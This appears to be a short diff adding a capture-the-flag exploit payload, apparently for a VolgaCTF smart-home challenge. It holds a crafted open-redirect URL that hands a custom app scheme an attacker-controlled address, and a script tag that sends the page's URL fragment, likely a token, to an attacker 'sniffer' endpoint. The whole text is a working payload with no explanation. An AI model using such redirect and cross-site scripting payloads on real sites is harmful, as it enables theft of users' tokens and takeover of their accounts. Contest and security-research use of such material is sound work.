@@ -1,0 +1,3 @@
+https://attacker.tld/redirect?url=volgactf://smarthome/?url=https://volgactf-iot.pw.attacker.tld/
+
+<script>fetch("https://attacker.tld/sniffer/?zzz="+location.hash.slice(1));</script>
